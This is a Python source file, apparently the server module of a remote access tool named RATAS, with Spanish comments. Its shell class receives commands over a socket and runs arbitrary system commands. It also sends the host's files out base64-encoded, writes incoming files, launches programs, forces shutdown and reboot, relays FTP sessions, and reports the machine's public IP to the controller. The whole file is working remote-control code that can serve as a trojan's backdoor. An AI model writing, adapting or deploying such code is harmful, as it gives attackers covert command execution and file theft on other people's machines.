#!/usr/bin/env python
# -*- coding: utf-8 -*-
# RATAS [shell_server_module]

import os
import subprocess
import ftplib
import time
import socket
from urllib import urlretrieve
from datetime import datetime
from base64 import urlsafe_b64encode, urlsafe_b64decode

class Shell:
    def __init__(self, conn):
        self.conn = conn

    # COMPROBAR SI UNA VARIABLE ESTA VACIA
    ############################################################################
    def isEmpty(self, variable):
        empty = False
        if len(str(variable)) == 0:
            empty = True
        return empty

    # CAMBIO DE DIRECTORIO LOCAL
    ############################################################################
    def cd(self, newPath):
        try:
            newPath = os.path.expanduser(newPath)
            os.chdir(newPath)
            output = os.getcwd()
        except:
            output = ':ERR:La ruta no existe o no es posible acceder a ella'
        return output

    # RECEPCIÓN DE FICHEROS POR EL SOCKET
    ############################################################################
    def getFile(self, destin):
        exists = self.conn.receive()
        if exists != ':NOEXISTS:':
            while True:
                self.conn.send(':SYNC:')
                bytesEncoded = self.conn.receive()
                if bytesEncoded == ':ENDFILE:':
                    self.conn.receive()  # Sincronización
                    break

                else:
                    try:
                        bytesDecoded = urlsafe_b64decode(bytesEncoded)
                        with open(destin, 'ab') as fileToSave:
                            fileToSave.write(bytesDecoded)

                    except:
                        self.conn.send(':ERR:Ha habido un error en la transferencia')
                        break

    # ENVIO DE FICHEROS POR EL SOCKET
    ############################################################################
    def sendFile(self, fileToSend):
        if os.path.exists(fileToSend):
            self.conn.send(':EXISTS:')
            with open(fileToSend, 'rb') as f:
                data = f.readlines()
            for line in data:
                lineEncoded = urlsafe_b64encode(line)
                imReady = self.conn.receive()
                if imReady == ':SYNC:':
                    self.conn.send(lineEncoded)

            self.conn.receive() # Sincronización
            self.conn.send(':ENDFILE:')

        else:
            self.conn.send(':NOEXISTS:')

    # EJECUCIÓN DE COMANDOS
    ############################################################################
    def executeLocal(self, command):

        output = ''
        if command.startswith('pwd'):  # Enviar directorio actual
            output = os.getcwd()
        ########################################################################
        elif command.startswith('cd'):  # Cambiar de directorio
            command = command.split(':&:')
            newPath = command[1]
            if self.isEmpty(newPath):
                output = os.getcwd()
            else:
                output = self.cd(newPath)
        ########################################################################
        elif command.startswith('start'):  # Ejecutar un archivo
            targetFile = command[1]
            try:
                if os.name == 'nt':
                    os.startfile(targetFile)
                elif os.name == 'posix':
                    subprocess.call(('xdg-open', targetFile))
                output = 'El fichero ha sido ejecutado.'
            except:
                output = (':ERR:Ha ocurrido un problema al intentar ejecutar el fichero...')
        ########################################################################
        elif command.startswith('getfile'):  # Envío de ficheros por socket
            inputData = command.split(':&:')
            fileToSend = inputData[1]
            self.sendFile(fileToSend)
            output = ''
        ########################################################################
        elif command.startswith('sendfile'):  # Recepción de ficheros por socket
            inputData = command.split(':&:')
            destin = inputData[1]
            self.getFile(destin)
            output = ''
        ########################################################################
        elif command.startswith('ftp'):  # Conectar a un FTP
            ftpLogin = command.split(':&:')
            host = ftpLogin[1]
            if len(ftpLogin) > 2:
                user = ftpLogin[2]
                password = ftpLogin[3]
            else:
                user = 'anonymous'
                password = 'anonymous@'
            try:
                global ftp
                ftp = ftplib.FTP(host, user, password)
                ftp.voidcmd('PWD')  # Comando de prueba para comprobar permisos
                output = ":FTP:" + ftp.getwelcome()
            except socket.gaierror:
                output = ":ERR:Host incorrecto"
            except ftplib.error_perm:
                output = ":ERR:Autenticación fallida"
        ########################################################################
        elif command.startswith('read'):  # Leer un fichero de texto plano
            targetFile = command[5:]
            if os.path.isfile(targetFile):
                output = ''
                with open(targetFile) as f:
                    for line in f:
                        output += line
            else:
                output = '\nEl fichero ' + targetFile + ' no existe.'
        ########################################################################
        elif command == 'shutdown':  # Apagar el servidor
                try:
                    if os.name == 'nt':
                        self.conn.send('El servidor se esta apagando...')
                        os.system('shutdown -s -f -t 0')
                    elif os.name == 'posix':
                        self.conn.send('El servidor se esta apagando...')
                        os.system('shutdown -h now')
                except:
                    output = ':ERR:Ha ocurrido un error.'
        ########################################################################
        elif command == 'reboot':  # Reiniciar el servidor
                try:
                    if os.name == 'nt':
                        self.conn.send('El servidor se está reiniciando...')
                        os.system('shutdown -r -f -t 0')
                    elif os.name == 'posix':
                        self.conn.send('El servidor se está reiniciando...')
                        os.system('shutdown -r now')
                except:
                    output = ':ERR:Ha ocurrido un error.'
        ########################################################################
        elif command == 'exit':  # Salir de la consola
            self.conn.close()
            output = ":CLOSE:"
        ########################################################################
        elif command == '':
            output = ':ERR:No has introducido ningun comando'
        ########################################################################
        else:  # Comandos propios de la shell del sistema
            command = command.replace(':&:', ' ')
            try:
                process = subprocess.Popen(command,
                                           shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                error = process.stderr.read()
                process.stderr.close()
                if error:
                    output = error
                else:
                    output = ''
                    for line in process.stdout:
                        output += line
                    process.stdout.close()
                if self.isEmpty(output):
                    output = ' '
            except OSError:
                output = ':ERR:Command not found'
        ########################################################################
        return output

    # CONSOLA FTP
    ############################################################################
    def executeFTP(self, comftp, ftp):

        commandFtp = comftp.replace(":FTP:", '')
        output = ':FTP:'
        ########################################################################
        if commandFtp.startswith('pwd'):  # Mostrar directorio actual del FTP
            try:
                output += ftp.pwd()
            except:
                output += ':ERR:Ha ocurrido un error'
        ########################################################################
        elif commandFtp.startswith('cd'):  # Cambiar de directorio
            ruta = commandFtp[3:]
            try:
                ftp.cwd(ruta)
                output += ftp.pwd()
            except:
                output += ':ERR:Ha ocurrido un error'
        ########################################################################
        elif commandFtp.startswith('ls'):  # Mostrar contenido del directorio
            try:
                fileList = []
                ftp.dir(fileList.append)
                for i in fileList:
                    output += ('\n' + i)
            except:
                output += ':ERR:Ha ocurrido un error'
        ########################################################################
        elif commandFtp.startswith('mkdir'):  # Crear directorio
            folder = commandFtp[6:]
            try:
                ftp.mkd(folder)
                output += '[*] El directorio ha sido creado con exito'
            except:
                output += ':ERR:No ha sido posible crear el directorio'
        ########################################################################
        elif commandFtp.startswith('rmdir'):  # Borrar directorio
            folder = commandFtp[6:]
            try:
                ftp.rmd(folder)
                output += '[*] El directorio ha sido eliminado con exito'
            except:
                output += ':ERR:No ha sido posible eliminar el directorio'
        ########################################################################
        elif commandFtp.startswith('up'):  # Subir a un FTP
            targetFile = commandFtp[3:]
            try:
                f = open(targetFile, 'rb')
                ftp.storbinary('STOR ' + targetFile, f)
                f.close()
                output += '[*] El fichero se ha subido con exito'
            except ftplib.error_perm:
                output += ':ERR:no tienes permiso para subir ficheros'
            except:
                output += ':ERR:No ha sido posible subir el fichero'
        ########################################################################
        elif commandFtp.startswith('down'):  # Descargar de un servidor FTP
            targetFile = commandFtp[5:]
            try:
                f = open(targetFile, 'wb')
                ftp.retrbinary('RETR ' + targetFile, f.write)
                f.close()
                output += '[*] El archivo se ha descargado con exito'
            except:
                output += ':ERR:No ha sido posible descargar el archivo'
        ########################################################################
        elif commandFtp.startswith('!cd'):  # Cambio de directorio local
            newPath = commandFtp[4:]
            if self.isEmpty(newPath):
                output += os.getcwd()
            else:
                output += self.cd(newPath)
        ########################################################################
        elif commandFtp in ['exit', 'bye', 'quit']:
            output = 'Se ha cerrado la conexion FTP'
            ftp.quit()
        ########################################################################
        elif commandFtp == '':
            output += ':ERR:No has introducido ningun comando'
        ########################################################################
        elif commandFtp.startswith('!'):
            commandFtp = commandFtp.replace('!', '')
            commandFtp = commandFtp.replace(' ', ':&:')
            output += self.executeLocal(commandFtp)
        ########################################################################
        else:
            try:
                output += ftp.sendcmd(commandFtp)
            except ftplib.error_perm:
                output += ':ERR:El comando no existe o no tienes permiso.'
        ########################################################################
        return output

    # ARRANCAR LA SHELL
    ############################################################################
    def start(self):
        cwd = ':CWD:' + os.getcwd()
        try:
            self.conn.send(self.conn.getPublicIP() + cwd)
        except:
            self.conn.send(self.conn.getPrivateIP() + cwd)

        while True:
                output = ''
                command = self.conn.receive()     # Recibe el comando a ejecutar
                if command.startswith(":FTP:"):
                    output = self.executeFTP(command, ftp)
                else:
                    output = self.executeLocal(command)

                if output == ":CLOSE:":
                    break

                output += ':CWD:' + os.getcwd()  # Añade siempre al final el directorio actual
                self.conn.send(output)  # Envía la salida
